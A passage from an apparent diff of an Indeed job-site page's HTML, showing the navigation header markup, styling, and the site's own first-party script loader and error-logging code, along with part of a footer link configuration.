6.183-7.25zm4.106 5.881a2.517 2.517 0 0 1-5.032 0 2.517 2.517 0 1 1 5.032 0z" fill="#003A9B"></path></svg></div></a><div class="css-102m5xo eu4oa1w0"><div class="css-1gmmtde e37uo190"><a id="FindJobs" aria-label="Home" aria-current="false" href="https://ca.indeed.com/" data-href="https://ca.indeed.com/?from=gnav-messaging--messaging-webapp" data-gnav-action="nav" data-gnav-element-name="FindJobs" class="css-p2fq43 e19afand0">Home</a></div><div class="css-1gmmtde e37uo190"><a id="CompanyReviews" aria-label="Company reviews" aria-current="false" href="https://ca.indeed.com/companies" data-href="https://ca.indeed.com/companies?from=gnav-messaging--messaging-webapp" data-gnav-action="nav" data-gnav-element-name="CompanyReviews" class="css-p2fq43 e19afand0">Company reviews</a></div><div class="css-1gmmtde e37uo190"><a id="FindSalaries" aria-label="Salary guide" aria-current="false" href="https://ca.indeed.com/career/salaries" data-href="https://ca.indeed.com/career/salaries?from=gnav-messaging--messaging-webapp" data-gnav-action="nav" data-gnav-element-name="FindSalaries" class="css-p2fq43 e19afand0">Salary guide</a></div></div></div><style data-emotion="gnav-header 1l66b0w">#gnav-main-container.gnav .gnav-header-1l66b0w{display:flex;box-sizing:border-box;margin-block-start:0;margin-block-end:0;margin-inline-start:0;margin-inline-end:0;min-inline-size:0;align-items:center;flex-wrap:wrap;flex-shrink:0;}</style><div class="gnav-header-1l66b0w e37uo190"><div class="css-1vysguw e37uo190"><div class="css-1i2r9e3 e37uo190"><style data-emotion="gnav-header 5byblv">#gnav-main-container.gnav .gnav-header-5byblv{box-sizing:border-box;background:none;appearance:none;text-align:start;text-decoration:none;border:none;cursor:pointer;user-select:none;align-items:center;justify-content:center;position:relative;margin-block-start:0;margin-block-end:0;margin-inline-start:0;margin-inline-end:0;padding-inline-start:1rem;padding-inline-end:1rem;line-height:1.5;font-family:"Indeed Sans","Noto Sans","Helvetica Neue","Helvetica","Arial","Liberation Sans","Roboto","Noto",sans-serif;font-size:1rem;font-weight:700;border-radius:0.5rem;transition:border-color 200ms cubic-bezier(0.645, 0.045, 0.355, 1),background-color 200ms cubic-bezier(0.645, 0.045, 0.355, 1),opacity 200ms cubic-bezier(0.645, 0.045, 0.355, 1),box-shadow 200ms cubic-bezier(0.645, 0.045, 0.355, 1),color 200ms cubic-bezier(0.645, 0.045, 0.355, 1),z-index 200ms cubic-bezier(0.645, 0.045, 0.355, 1);display:inline-flex;inline-size:auto;padding-block-start:0.5625rem;padding-block-end:0.5625rem;min-block-size:2.75rem;box-shadow:none;background-color:transparent;color:#2557a7;background-color:#ffffff;height:3rem;transition:none;border:none;padding-left:0.625rem;padding-right:0.625rem;min-height:3rem;min-width:3rem;color:#2d2d2d;}#gnav-main-container.gnav .gnav-header-5byblv::-moz-focus-inner{border:0;}@media (prefers-reduced-motion: reduce){#gnav-main-container.gnav .gnav-header-5byblv{transition:none;}}#gnav-main-container.gnav .gnav-header-5byblv:disabled{opacity:0.4;pointer-events:none;}#gnav-main-container.gnav .gnav-header-5byblv:focus{outline:none;box-shadow:0 0 0 0.125rem rgb(255,255,255),0 0 0 0.1875rem rgb(37,87,167);}#gnav-main-container.gnav .gnav-header-5byblv:focus:not([data-focus-visible-added]){box-shadow:none;}#gnav-main-container.gnav .gnav-header-5byblv[aria-disabled='true']{cursor:default;}#gnav-main-container.gnav .gnav-header-5byblv:visited{color:#2557a7;}#gnav-main-container.gnav .gnav-header-5byblv:hover:not([aria-disabled='true']){color:#164081;background-color:#eef1fe;}#gnav-main-container.gnav .gnav-header-5byblv:active:not([aria-disabled='true']){box-shadow:inset 0 0.125rem 0.25rem 0 rgba(45,45,45,0.08),inset 0 0.0625rem 0.1875rem 0 rgba(45,45,45,0.12),inset 0 0 0.125rem 0 rgba(45,45,45,0.2);background-color:#c7d2f6;color:#0d2d5e;}#gnav-main-container.gnav .gnav-header-5byblv[aria-disabled='true']{color:rgba(37,87,167,0.4);}#gnav-main-container.gnav .gnav-header-5byblv:hover{background-color:transparent;color:#2d2d2d;}#gnav-main-container.gnav .gnav-header-5byblv:focus{border:none;box-shadow:#2557a7 0 0 0 0.0625rem;}@media screen and (min-width: 62em){#gnav-main-container.gnav .gnav-header-5byblv{min-height:4.375rem;padding-top:1.3125rem;}}</style><a aria-label="Messages Unread count 0" href="https://messages.indeed.com?from=gnav-util-messaging--messaging-webapp&amp;gnavTK=1ijcmm45mgo9s801&amp;tk=1ijcmm45dkh7u8lk&amp;co=CA&amp;hl=en" data-gnav-element-name="Inbox" class="gnav-header-5byblv e71d0lh0"><svg style="width:1.625rem;height:100%" viewBox="0 0 218 218" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false"><g clip-path="url(#clip0)"><path fill-rule="evenodd" clip-rule="evenodd" d="M186.055 27.2253C188.552 27.2253 190.552 29.2497 190.552 31.7469V149.31C190.552 151.807 188.528 153.831 186.031 153.831H92.9662L62.9211 187.632C60.1652 190.732 55.038 188.795 55.02 184.647L54.886 153.831H32.2951C29.7978 153.831 27.7734 151.807 27.7734 149.31V31.747C27.7734 29.2498 29.7236 27.2254 32.2209 27.2254L186.055 27.2253Z" fill="#2D2D2D"></path><path d="M59.6547 119.901C57.1575 119.901 55.1331 117.877 55.1331 115.379V106.336C55.1331 103.839 57.1575 101.815 59.6547 101.815L123.769 101.815C126.266 101.815 128.29 103.839 128.29 106.336V115.379C128.29 117.877 126.266 119.901 123.769 119.901H59.6547Z" fill="white"></path><path d="M59.6547 83.728C57.1575 83.728 55.1331 81.7036 55.1331 79.2064V70.1631C55.1331 67.6659 57.1575 65.6415 59.6547 65.6415L150.968 65.6415C153.465 65.6415 155.49 67.6659 155.49 70.1631V79.2064C155.49 81.7036 153.465 83.728 150.968 83.728H59.6547Z" fill="white"></path></g><defs><clipPath id="clip0"><rect width="217.038" height="217.038" fill="white" transform="translate(0.643799 0.095459)"></rect></clipPath></defs></svg><style data-emotion="gnav-header 8u2krs">#gnav-main-container.gnav .gnav-header-8u2krs{border:0;clip:rect(0 0 0 0);block-size:0.0625rem;margin-block-start:-0.0625rem;margin-block-end:-0.0625rem;margin-inline-start:-0.0625rem;margin-inline-end:-0.0625rem;overflow:hidden;padding-block-start:0;padding-block-end:0;padding-inline-start:0;padding-inline-end:0;position:absolute;inline-size:0.0625rem;white-space:nowrap;word-wrap:normal;}</style><span aria-live="polite" aria-atomic="true" class="gnav-header-8u2krs esbq1260">Messages Unread count 0</span></a></div><div class="css-12b8s95 e37uo190"><a aria-label="Notifications Unread count 0" href="https://ca.indeed.com/notifications?from=gnav-util-messaging--messaging-webapp&amp;gnavTK=1ijcmm45mgo9s801&amp;tk=1ijcmm45dkh7u8lk&amp;hl=en" data-gnav-element-name="Notifications" class="css-5byblv e71d0lh0"><style data-emotion="gnav-header 1f4rn1b">#gnav-main-container.gnav .gnav-header-1f4rn1b{inline-size:1.5rem;block-size:1.5rem;color:inherit;}</style><svg xmlns="http://www.w3.org/2000/svg" focusable="false" role="img" fill="currentColor" viewBox="0 0 24 24" aria-hidden="true" class="gnav-header-1f4rn1b eac13zx0"><path d="M12 2c-.8284 0-1.5.6716-1.5 1.5v.161C7.3548 4.3479 5 7.149 5 10.5V16l-1.7929 1.7929a.7072.7072 0 00.5 1.2071H20.293a.7071.7071 0 00.5-1.2071L19 16v-5.5c0-3.3511-2.3548-6.1522-5.5-6.839V3.5c0-.8284-.6716-1.5-1.5-1.5zM11.9999 22c-1.3062 0-2.4174-.8348-2.8293-2h5.6586c-.4118 1.1652-1.523 2-2.8293 2z"></path></svg></a></div></div><style data-emotion="gnav-header nwl6de">#gnav-main-container.gnav .gnav-header-nwl6de{box-sizing:border-box;margin-block-start:0;margin-block-end:0;margin-inline-start:0;margin-inline-end:0;min-inline-size:0;display:none;position:relative;height:100%;padding-right:0.5rem;}@media screen and (min-width: 62em){#gnav-main-container.gnav .gnav-header-nwl6de{display:flex;}}</style><div class="gnav-header-nwl6de eu4oa1w0"><div><div class="css-12b8s95 e37uo190"><style data-emotion="gnav-header 1ood4vv">#gnav-main-container.gnav .gnav-header-1ood4vv{box-sizing:border-box;background:none;appearance:none;text-align:start;text-decoration:none;border:none;cursor:pointer;user-select:none;align-items:center;justify-content:center;position:relative;margin-block-start:0;margin-block-end:0;margin-inline-start:0;margin-inline-end:0;padding-inline-start:1rem;padding-inline-end:1rem;line-height:1.5;font-family:"Indeed Sans","Noto Sans","Helvetica Neue","Helvetica","Arial","Liberation Sans","Roboto","Noto",sans-serif;font-size:1rem;font-weight:700;border-radius:0.5rem;transition:border-color 200ms cubic-bezier(0.645, 0.045, 0.355, 1),background-color 200ms cubic-bezier(0.645, 0.045, 0.355, 1),opacity 200ms cubic-bezier(0.645, 0.045, 0.355, 1),box-shadow 200ms cubic-bezier(0.645, 0.045, 0.355, 1),color 200ms cubic-bezier(0.645, 0.045, 0.355, 1),z-index 200ms cubic-bezier(0.645, 0.045, 0.355, 1);display:inline-flex;inline-size:auto;padding-block-start:0.5625rem;padding-block-end:0.5625rem;min-block-size:2.75rem;box-shadow:none;background-color:transparent;color:#2557a7;color:#2d2d2d;padding-inline-start:0.5625rem;padding-inline-end:0.5625rem;min-inline-size:2.75rem;font-weight:400;padding-left:0.625rem;padding-right:0.625rem;min-width:3rem;background-color:#ffffff;height:3rem;transition:none;border:none;min-height:3rem;}#gnav-main-container.gnav .gnav-header-1ood4vv::-moz-focus-inner{border:0;}@media (prefers-reduced-motion: reduce){#gnav-main-container.gnav .gnav-header-1ood4vv{transition:none;}}#gnav-main-container.gnav .gnav-header-1ood4vv:disabled{opacity:0.4;pointer-events:none;}#gnav-main-container.gnav .gnav-header-1ood4vv:focus{outline:none;box-shadow:0 0 0 0.125rem rgb(255,255,255),0 0 0 0.1875rem rgb(37,87,167);}#gnav-main-container.gnav .gnav-header-1ood4vv:focus:not([data-focus-visible-added]){box-shadow:none;}#gnav-main-container.gnav .gnav-header-1ood4vv[aria-disabled='true']{cursor:default;}#gnav-main-container.gnav .gnav-header-1ood4vv:visited{color:#2557a7;}#gnav-main-container.gnav .gnav-header-1ood4vv:hover:not([aria-disabled='true']){color:#164081;background-color:#eef1fe;}#gnav-main-container.gnav .gnav-header-1ood4vv:active:not([aria-disabled='true']){box-shadow:inset 0 0.125rem 0.25rem 0 rgba(45,45,45,0.08),inset 0 0.0625rem 0.1875rem 0 rgba(45,45,45,0.12),inset 0 0 0.125rem 0 rgba(45,45,45,0.2);background-color:#c7d2f6;color:#0d2d5e;}#gnav-main-container.gnav .gnav-header-1ood4vv[aria-disabled='true']{color:rgba(37,87,167,0.4);}#gnav-main-container.gnav .gnav-header-1ood4vv:hover{background-color:transparent;color:#2d2d2d;}#gnav-main-container.gnav .gnav-header-1ood4vv:active{color:#2d2d2d;}#gnav-main-container.gnav .gnav-header-1ood4vv:focus{border:none;box-shadow:none;outline:0.0625rem solid #2557a7;}@media screen and (min-width: 62em){#gnav-main-container.gnav .gnav-header-1ood4vv{min-height:4.375rem;padding-top:1.3125rem;}}</style><button aria-label="Account" aria-expanded="false" id="AccountMenu" data-gnav-element-name="AccountMenu" data-gnav-action="open" class="gnav-header-1ood4vv e8ju0x50"><style data-emotion="gnav-header cdphbd">#gnav-main-container.gnav .gnav-header-cdphbd{display:inline-flex;position:relative;flex-shrink:0;vertical-align:middle;}</style><span class="gnav-header-cdphbd e19sp6e01"><svg xmlns="http://www.w3.org/2000/svg" focusable="false" role="img" fill="currentColor" viewBox="0 0 24 24" aria-hidden="true" class="gnav-header-1f4rn1b eac13zx0"><path d="M12 12c2.4862 0 4.5-2.0137 4.5-4.5S14.4862 3 12 3C9.5137 3 7.5 5.0137 7.5 7.5S9.5137 12 12 12zm0 2.25c-3.0038 0-9 1.5075-9 4.5v1.75a.5.5 0 00.5.5h17a.5.5 0 00.5-.5v-1.75c0-2.9925-5.9963-4.5-9-4.5z"></path></svg><style data-emotion="gnav-header 13gh36c animation-1k0n1vg">#gnav-main-container.gnav .gnav-header-13gh36c{align-content:center;align-items:center;background-color:#d93a40;border:0.0625rem solid transparent;border-color:#ffffff;border-radius:9999rem;box-sizing:border-box;color:#ffffff;display:flex;flex-flow:row wrap;font-family:"Indeed Sans","Noto Sans","Helvetica Neue","Helvetica","Arial","Liberation Sans","Roboto","Noto",sans-serif;font-size:0.875rem;font-weight:700;block-size:1.5rem;justify-content:center;line-height:0;min-inline-size:1.5rem;padding-inline-start:0.4375rem;padding-inline-end:0.4375rem;z-index:1;position:absolute;top:0;right:0;transform:translate(50%, -33%);transform-origin:100% 17%;animation-duration:0s;animation-fill-mode:both;animation-name:animation-1k0n1vg;}#gnav-main-container.gnav .gnav-header-13gh36c>svg{margin-block-start:-0.375rem;margin-block-end:-0.375rem;margin-inline-start:-0.375rem;margin-inline-end:-0.375rem;}@media (prefers-reduced-motion: reduce){#gnav-main-container.gnav .gnav-header-13gh36c{animation:none;opacity:0;}}@keyframes animation-1k0n1vg{20%{transform:scale3d(0.9, 0.9, 0.9) translate(50%, -33%);}50%,55%{opacity:1;transform:scale3d(1.1, 1.1, 1.1) translate(50%, -33%);}to{opacity:0;transform:scale3d(0.3, 0.3, 0.3) translate(50%, -33%);}}</style><span aria-hidden="true" id="ifl-Badge-:Rsq6ko:" class="gnav-header-13gh36c e19sp6e00">1<span class="gnav-header-8u2krs esbq1260"> new update</span></span></span></button></div></div></div><div class="css-102m5xo eu4oa1w0"><div class="css-154tnvg eu4oa1w0"></div><div class="css-kg8qc6 eu4oa1w0"><div class="css-1u99t23 e37uo190"><div class="css-f277vx e37uo190"><button disabled="" data-gnav-element-name="LanguageSwitcher" class="css-v5q9is e8ju0x50"><span aria-hidden="true">En</span><span lang="en" class="css-8u2krs esbq1260">English</span></button></div><div class="css-1dtjgyb e37uo190"><button data-gnav-element-name="LanguageSwitcher" class="css-1135qr8 e8ju0x50"><span aria-hidden="true">Fr</span><span lang="fr" class="css-8u2krs esbq1260">Français</span></button></div></div></div></div><style data-emotion="gnav-header 102m5xo">#gnav-main-container.gnav .gnav-header-102m5xo{box-sizing:border-box;margin-block-start:0;margin-block-end:0;margin-inline-start:0;margin-inline-end:0;min-inline-size:0;display:none;height:100%;align-items:center;}@media screen and (min-width: 62em){#gnav-main-container.gnav .gnav-header-102m5xo{display:flex;}}</style><div class="gnav-header-102m5xo eu4oa1w0"><div class="css-154tnvg eu4oa1w0"></div><style data-emotion="gnav-header 1tb0yhl">#gnav-main-container.gnav .gnav-header-1tb0yhl{box-sizing:border-box;margin-block-start:0;margin-block-end:0;margin-inline-start:0;margin-inline-end:0;min-inline-size:0;margin-left:1.5rem;height:100%;}</style><div class="gnav-header-1tb0yhl eu4oa1w0"><div class="css-1gmmtde e37uo190"><a id="EmployersPostJob" aria-label="Employers / Post Job" aria-current="false" href="https://employers.indeed.com/p/posting?co=CA&amp;hl=en_CA" data-href="https://employers.indeed.com/p/posting?co=CA&amp;hl=en_CA&amp;from=gnav-menu-messaging--messaging-webapp&amp;ikw=gnav-header-hire&amp;isid=employerlink-CA&amp;trafficTK=1ihuecnt7kupu801&amp;jstm=1738814460098" data-gnav-action="nav" data-gnav-element-name="EmployersPostJob" class="css-p2fq43 e19afand0">Employers / Post Job</a></div></div></div><style data-emotion="gnav-header 8rs3tb">#gnav-main-container.gnav .gnav-header-8rs3tb{box-sizing:border-box;margin-block-start:0;margin-block-end:0;margin-inline-start:0;margin-inline-end:0;min-inline-size:0;display:flex;height:auto;}@media screen and (min-width: 62em){#gnav-main-container.gnav .gnav-header-8rs3tb{display:none;}}</style><div class="gnav-header-8rs3tb eu4oa1w0"><div class="css-12b8s95 e37uo190"><style data-emotion="gnav-header 14sw8mm">#gnav-main-container.gnav .gnav-header-14sw8mm{box-sizing:border-box;background:none;appearance:none;text-align:start;text-decoration:none;border:none;cursor:pointer;user-select:none;align-items:center;justify-content:center;position:relative;margin-block-start:0;margin-block-end:0;margin-inline-start:0;margin-inline-end:0;padding-inline-start:1rem;padding-inline-end:1rem;line-height:1.5;font-family:"Indeed Sans","Noto Sans","Helvetica Neue","Helvetica","Arial","Liberation Sans","Roboto","Noto",sans-serif;font-size:1rem;font-weight:700;border-radius:0.5rem;transition:border-color 200ms cubic-bezier(0.645, 0.045, 0.355, 1),background-color 200ms cubic-bezier(0.645, 0.045, 0.355, 1),opacity 200ms cubic-bezier(0.645, 0.045, 0.355, 1),box-shadow 200ms cubic-bezier(0.645, 0.045, 0.355, 1),color 200ms cubic-bezier(0.645, 0.045, 0.355, 1),z-index 200ms cubic-bezier(0.645, 0.045, 0.355, 1);display:inline-flex;inline-size:auto;padding-block-start:0.5625rem;padding-block-end:0.5625rem;min-block-size:2.75rem;box-shadow:none;background-color:transparent;color:#2557a7;color:#2d2d2d;padding-inline-start:0.5625rem;padding-inline-end:0.5625rem;min-inline-size:2.75rem;background-color:#ffffff;height:3rem;transition:none;border:none;padding-left:0.625rem;padding-right:0.625rem;min-height:3rem;min-width:3rem;}#gnav-main-container.gnav .gnav-header-14sw8mm::-moz-focus-inner{border:0;}@media (prefers-reduced-motion: reduce){#gnav-main-container.gnav .gnav-header-14sw8mm{transition:none;}}#gnav-main-container.gnav .gnav-header-14sw8mm:disabled{opacity:0.4;pointer-events:none;}#gnav-main-container.gnav .gnav-header-14sw8mm:focus{outline:none;box-shadow:0 0 0 0.125rem rgb(255,255,255),0 0 0 0.1875rem rgb(37,87,167);}#gnav-main-container.gnav .gnav-header-14sw8mm:focus:not([data-focus-visible-added]){box-shadow:none;}#gnav-main-container.gnav .gnav-header-14sw8mm[aria-disabled='true']{cursor:default;}#gnav-main-container.gnav .gnav-header-14sw8mm:visited{color:#2557a7;}#gnav-main-container.gnav .gnav-header-14sw8mm:hover:not([aria-disabled='true']){color:#164081;background-color:#eef1fe;}#gnav-main-container.gnav .gnav-header-14sw8mm:active:not([aria-disabled='true']){box-shadow:inset 0 0.125rem 0.25rem 0 rgba(45,45,45,0.08),inset 0 0.0625rem 0.1875rem 0 rgba(45,45,45,0.12),inset 0 0 0.125rem 0 rgba(45,45,45,0.2);background-color:#c7d2f6;color:#0d2d5e;}#gnav-main-container.gnav .gnav-header-14sw8mm[aria-disabled='true']{color:rgba(37,87,167,0.4);}#gnav-main-container.gnav .gnav-header-14sw8mm:hover{background-color:transparent;color:#2d2d2d;}#gnav-main-container.gnav .gnav-header-14sw8mm:active{color:#2d2d2d;}#gnav-main-container.gnav .gnav-header-14sw8mm:focus{border:none;box-shadow:#2557a7 0 0 0 0.0625rem;}@media screen and (min-width: 62em){#gnav-main-container.gnav .gnav-header-14sw8mm{min-height:4.375rem;padding-top:1.3125rem;}}</style><button tabindex="0" aria-label="Primary navigation" data-gnav-element-name="BurgerMenu" data-gnav-action="open" aria-controls="gnav-burger-menu-nav" aria-expanded="false" class="gnav-header-14sw8mm e8ju0x50"><span class="gnav-header-cdphbd e19sp6e01"><style data-emotion="gnav-header 1hdbuey">#gnav-main-container.gnav .gnav-header-1hdbuey{inline-size:1.5rem;block-size:1.5rem;color:inherit;margin:auto;}</style><svg xmlns="http://www.w3.org/2000/svg" focusable="false" role="img" fill="currentColor" viewBox="0 0 24 24" aria-hidden="true" class="gnav-header-1hdbuey eac13zx0"><path d="M4 6h16c.5523 0 1 .4477 1 1s-.4477 1-1 1H4c-.5523 0-1-.4477-1-1s.4477-1 1-1zM20 11H4c-.5523 0-1 .4477-1 1s.4477 1 1 1h16c.5523 0 1-.4477 1-1s-.4477-1-1-1zM20 16H4c-.5523 0-1 .4477-1 1s.4477 1 1 1h16c.5523 0 1-.4477 1-1s-.4477-1-1-1z"></path></svg><span aria-hidden="true" id="ifl-Badge-:R76uko:" class="gnav-header-13gh36c e19sp6e00">1<span class="gnav-header-8u2krs esbq1260"> new update</span></span></span></button></div></div></div></div><span id="gnav-header-end" tabindex="-1" class="css-mzoh48 esbq1260">Start of main content</span></div></nav><script>
+"use strict";(()=>{const e=window._INDEED=window._INDEED||{},o=e.shared=e.shared||{};o.v1||(o.v1={load:function(){for(var e=arguments.length,n=new Array(e),r=0;r<e;r++)n[r]=arguments[r];return new Promise(((e,r)=>{o.v1.load.q.push({args:n,resolve:e,reject:r})}))},initialize:e=>{o.v1.config||(o.v1.config=e,n(3))}},o.v1.load.q=[]);const n=e=>{if(o.v1.load.q){const r=o.v1.config;let s=r.loadersUrl;const t=localStorage.getItem("shared-deps.branch")??r.branch;t&&(s=s.replace("sharedDepsLoaders",`${t}/sharedDepsLoaders`));const a=document.createElement("script");a.async=!0,a.src=s,a.crossOrigin="anonymous",a.onerror=o=>{if(o instanceof ErrorEvent){const t=e-1;if(t>0)n(t);else{var s;const{error:e,message:n,filename:t,lineno:a,colno:c}=o,d=(null==e?void 0:e.name)||"SharedDepsShimLoaderError",i=(null==e?void 0:e.message)||n||"Failed to fetch & execute sharedDepsLoader",l=(null==e?void 0:e.toString())||`${d}: ${i}`,m=null===(s=(null==e?void 0:e.stack)||`event: ${t}:${a}:${c}\nonerror: ${(new Error).stack}`)||void 0===s?void 0:s.substring(0,1e3),h=document.createElement("script");h.async=!0,h.crossOrigin="anonymous",h.src=`${r.logRoute}&logType=${r.jsErrorLogType}&lth=${r.jsErrorLth}&name=${d}&message=${encodeURIComponent(i)}&toString=${encodeURIComponent(l)}&stack=${encodeURIComponent(m)}`,document.head.appendChild(h)}}},document.head.appendChild(a)}}})();
+window._INDEED.shared.v1.initialize({"publicPath":"https://c03.s3.indeed.com/shared/","loadersUrl":"https://c03.s3.indeed.com/shared/sharedDepsLoadersV1.autoupgrade.js","shareScopes":["react18_ifl6"],"groups":{},"logRoute":"https://t.indeed.com/signals/gnav/log?from=messaging--messaging-webapp-messaging&parentLogId=1ijcmm45mgo9s801&hostAppTk=1ijcmm45dkh7u8lk","jsErrorLogType":"gnavJSError","jsErrorLth":"6411ec182c6acd8714dc2d03716eed1d"});
+</script><script>(() => {
+var callFnWhenReady = window._INDEED && window._INDEED.shared && window._INDEED.shared.v1 ? (fn) => fn() : (fn) => window.addEventListener('onSharedDepsLoadersV1Available', fn, { once: true });
+callFnWhenReady(() => window._INDEED.shared.v1.load("module", {"urls":["https://c03.s3.indeed.com/dist/header/remoteEntry.5955a0beb1376e355d1c.js"],"container":"gnavHeaderModule","module":"./jobseekerHeader","shareScope":"react18_ifl6","afterEvent":"DOMContentLoaded"}).catch(()=>null));
+})();</script><div id="gnav-script-contents">
         <script>
-          "use strict"
-          ;(() => {
-            const e = (window._INDEED = window._INDEED || {}),
-              o = (e.shared = e.shared || {})
-            o.v1 ||
-              ((o.v1 = {
-                load: function () {
-                  for (
-                    var e = arguments.length, n = new Array(e), r = 0;
-                    r < e;
-                    r++
-                  )
-                    n[r] = arguments[r]
-                  return new Promise((e, r) => {
-                    o.v1.load.q.push({ args: n, resolve: e, reject: r })
-                  })
-                },
-                initialize: (e) => {
-                  o.v1.config || ((o.v1.config = e), n(3))
-                },
-              }),
-              (o.v1.load.q = []))
-            const n = (e) => {
-              if (o.v1.load.q) {
-                const r = o.v1.config
-                let s = r.loadersUrl
-                const t = localStorage.getItem("shared-deps.branch") ?? r.branch
-                t &&
-                  (s = s.replace("sharedDepsLoaders", `${t}/sharedDepsLoaders`))
-                const a = document.createElement("script")
-                ;(a.async = !0),
-                  (a.src = s),
-                  (a.crossOrigin = "anonymous"),
-                  (a.onerror = (o) => {
-                    if (o instanceof ErrorEvent) {
-                      const t = e - 1
-                      if (t > 0) n(t)
-                      else {
-                        var s
-                        const {
-                            error: e,
-                            message: n,
-                            filename: t,
-                            lineno: a,
-                            colno: c,
-                          } = o,
-                          d =
-                            (null == e ? void 0 : e.name) ||
-                            "SharedDepsShimLoaderError",
-                          i =
-                            (null == e ? void 0 : e.message) ||
-                            n ||
-                            "Failed to fetch & execute sharedDepsLoader",
-                          l =
-                            (null == e ? void 0 : e.toString()) || `${d}: ${i}`,
-                          m =
-                            null ===
-                              (s =
-                                (null == e ? void 0 : e.stack) ||
-                                `event: ${t}:${a}:${c}\nonerror: ${new Error().stack}`) ||
-                            void 0 === s
-                              ? void 0
-                              : s.substring(0, 1e3),
-                          h = document.createElement("script")
-                        ;(h.async = !0),
-                          (h.crossOrigin = "anonymous"),
-                          (h.src = `${r.logRoute}&logType=${r.jsErrorLogType}&lth=${r.jsErrorLth}&name=${d}&message=${encodeURIComponent(i)}&toString=${encodeURIComponent(l)}&stack=${encodeURIComponent(m)}`),
-                          document.head.appendChild(h)
-                      }
+            window.signals_transport = window.signals_transport || { 
+                emitSignal: function(data){
+                    window.signals_transport_tmp = window.signals_transport_tmp || [];
+                    if (window.signals_transport_tmp.length < 1000) {
+                        window.signals_transport_tmp.push(data);
                     }
-                  }),
-                  document.head.appendChild(a)
-              }
-            }
-          })()
-          window._INDEED.shared.v1.initialize({
-            publicPath: "https://c03.s3.indeed.com/shared/",
-            loadersUrl:
-              "https://c03.s3.indeed.com/shared/sharedDepsLoadersV1.autoupgrade.js",
-            shareScopes: ["react18_ifl6"],
-            groups: {},
-            logRoute:
-              "https://t.indeed.com/signals/gnav/log?from=passport--passport-webapp-%2Fauth&parentLogId=1ihb53j98gqp4801&hostAppTk=",
-            jsErrorLogType: "gnavJSError",
-            jsErrorLth: "6411ec182c6acd8714dc2d03716eed1d",
-          })
-        </script>
-        <script>
-          ;(() => {
-            var callFnWhenReady =
-              window._INDEED &&
-              window._INDEED.shared &&
-              window._INDEED.shared.v1
-                ? (fn) => fn()
-                : (fn) =>
-                    window.addEventListener(
-                      "onSharedDepsLoadersV1Available",
-                      fn,
-                      { once: true },
-                    )
-            callFnWhenReady(() =>
-              window._INDEED.shared.v1
-                .load("module", {
-                  urls: [
-                    "https://c03.s3.indeed.com/dist/header/remoteEntry.67a667b9c62469e9f6e4.js",
-                  ],
-                  container: "gnavHeaderModule",
-                  module: "./noNavHeader",
-                  shareScope: "react18_ifl6",
-                  afterEvent: "DOMContentLoaded",
-                })
-                .catch(() => null),
-            )
-          })()
-        </script>
-        <div id="gnav-script-contents">
-          <script>
-            window.signals_transport = window.signals_transport || {
-              emitSignal: function (data) {
-                window.signals_transport_tmp =
-                  window.signals_transport_tmp || []
-                if (window.signals_transport_tmp.length < 1000) {
-                  window.signals_transport_tmp.push(data)
                 }
-              },
-            }
-          </script>
-
-          <script>
-            window.pagenavigation = window.pagenavigation || {
-              recordInitialNavigation: (params) => {
-                window.initial_pagnav_params_tmp = params
-              },
-              markSoftNavigationStart: () => {},
-            }
-          </script>
-        </div>
-      </div>
-      <div id="passpage-container" class="passpage-container auth"></div>
-      <div class="pass-footer-container dd-privacy-allow">
-        <script id="_indeed_gnav_footer_config" type="application/json">
-          {
-            "footerVariant": "DESKTOP_JOBSEEKER_FOOTER",
-            "nonPersonalizedExperienceProps": {
-              "nonPersonalizedExperienceTestActive": false
-            },
-            "hideFooterLinks": true,
-            "desktopJobseekerFooterConfig": {
-              "links": [
-                {
-                  "description": "Hiring Lab",
-                  "href": "https://www.hiringlab.org",
-                  "dataHref": "https://www.hiringlab.org?from=gnav-passport--passport-webapp",
-                  "dataGnavElementName": "HiringLab"
-                },
-                {
-                  "description": "Career advice",
-                  "href": "https://www.indeed.com/career-advice",
-                  "dataHref": "https://www.indeed.com/career-advice?from=gnav-passport--passport-webapp",
-                  "dataGnavElementName": "CareerAdvice"
-                },
-                {
-                  "description": "Browse jobs",
-                  "href": "https://www.indeed.com/browsejobs",
-                  "dataHref": "https://www.indeed.com/browsejobs?from=gnav-passport--passport-webapp",
-                  "dataGnavElementName": "BrowseJobs"
-                },
-                {
-                  "description": "Browse companies",
-                  "href": "https://www.indeed.com/companies/browse-companies",
-                  "dataHref": "https://www.indeed.com/companies/browse-companies?from=gnav-passport--passport-webapp",
-                  "dataGnavElementName": "BrowseCompanies"
-                },
-                {
-                  "description": "Salaries",
-                  "href": "https://www.indeed.com/career/salaries",
-                  "dataHref": "https://www.indeed.com/career/salaries?from=gnav-passport--passport-webapp",
-                  "dataGnavElementName": "Salaries"
-                },
-                {
-                  "description": "Indeed Events",
-                  "href": "https://www.indeedevents.com/",
-                  "dataHref": "https://www.indeedevents.com/?from=gnav-passport--passport-webapp",
-                  "dataGnavElementName": "IndeedEvents"
-                },
-                {
-                  "description": "Work at Indeed",
-                  "href": "https://www.indeed.com/cmp/indeed/about",
-                  "dataHref": "https://www.indeed.com/cmp/indeed/about?from=gnav-passport--passport-webapp",
-                  "dataGnavElementName": "WorkAtIndeed"
-                },
-                {
-                  "description": "Countries",
-                  "href": "https://www.indeed.com/worldwide",
-                  "dataHref": "https://www.indeed.com/worldwide?from=gnav-passport--passport-webapp",
-                  "dataGnavElementName": "Countries"
-                },
-                {
-                  "description": "About",
-                  "href": "https://www.indeed.com/about",
-                  "dataHref": "https://www.indeed.com/about?from=gnav-passport--passport-webapp",
-                  "dataGnavElementName": "About"
-                },
-                {
-                  "description": "Help",
-                  "href": "https://www.indeed.com/help",
-                  "dataHref": "https://www.indeed.com/help?from=gnav-passport--passport-webapp",
-                  "dataGnavElementName": "JobseekerHelpCenter"
-                },
-                {
-                  "description": "ESG at Indeed",
-                  "href": "https://www.indeed.com/esg?from=gnav-passport--passport-webapp",
-                  "dataHref": "https://www.indeed.com/esg?from=gnav-passport--passport-webapp",
-                  "dataGnavElementName": "JobseekerESGInclusionData"
-                }
-              ],
-              "impressumLinks": [
-                {
-                  "description": "Your Privacy Choices",
-                  "href": "https://www.indeed.com/legal/ccpa-dns?hl=en",
-                  "dataHref": "https://www.indeed.com/legal/ccpa-dns?hl=en\u0026from=gnav-passport--passport-webapp",
-                  "dataGnavElementName": "CPRA"
-                },
-                {
-                  "description": "Accessibility at Indeed",
-                  "href": "https://www.indeed.com/accessibility?hl=en",
